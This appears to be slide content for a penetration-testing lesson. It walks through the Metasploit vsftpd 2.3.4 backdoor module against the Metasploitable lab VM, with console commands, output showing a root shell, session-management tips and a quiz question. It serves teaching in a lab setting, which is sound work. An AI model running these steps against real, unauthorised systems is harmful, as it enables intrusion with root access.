title: Exploiting with Metasploit: Step-by-Step 🎯
description: Walk through a real exploit against Metasploitable using vsftpd backdoor.

slides.title: Target: vsftpd 2.3.4 Backdoor 🚪
slides.content:
# The Scenario

We previously scanned Metasploitable and identified:
- Port 21 open
- Service: **vsftpd 2.3.4**

This specific version contains a **backdoor** triggered by a smiley face `:)` in the username. The backdoor opens a shell on port **6200**.

**Metasploit Module**: `exploit/unix/ftp/vsftpd_234_backdoor`

**Goal**: Use Metasploit to trigger the backdoor and get a command shell on the target.

slides.title: Step 1: Search and Select 🔍
slides.codeSnippet:
msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor

msf6 > use 0
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >

slides.title: Step 2: View Options and Set Target ⚙️
slides.content:
# Configuring the Exploit

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s)
   RPORT   21               yes       The target port (TCP)

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101
```

**Note**: There's no `LHOST` required for this module because the backdoor opens a shell on the **target's** port 6200, not a reverse connection.

quizData.question: In Metasploit, what does `RHOSTS` typically represent?

options.text: The IP address of the attacking machine.
The remote target IP address or range.
The port to listen on for a reverse shell.

quizData.explanation: RHOSTS is the Remote Host(s) to target.

slides.title: Step 3: Run the Exploit 🚀
slides.content: Execute the module and watch for the shell.
slides.codeSnippet:
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.101:21 - USER: 331 Please specify the password.
[+] 192.168.56.101:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.102:45123 -> 192.168.56.101:6200)

whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

**Success!** We have a root shell on the target.

slides.title: Understanding What Happened 🔬
slides.content:
# Behind the Scenes

1.  Metasploit connected to FTP port 21.
2.  It sent the username containing `:)` followed by any password.
3.  The backdoored vsftpd service opened a **listening shell on port 6200**.
4.  Metasploit automatically connected to that port and gave us interactive access.

**Critical Observation**: The shell we received is **root**. This is a **privileged** foothold. We own the box completely.

**To exit the shell**: Press `Ctrl+C` and type `y` to abort session, or type `exit` in the shell. The session will still be listed in `sessions -l` as backgrounded.

slides.title: Session Management ⚠️
slides.content:
## Don't Lose Your Shell!

If you accidentally close the terminal, you lose the shell. Always use `background` (`Ctrl+Z`) to keep the session alive in Metasploit.

```bash
# Background current session
Ctrl+Z

# List sessions
sessions -l

# Resume session 1
sessions -i 1
```
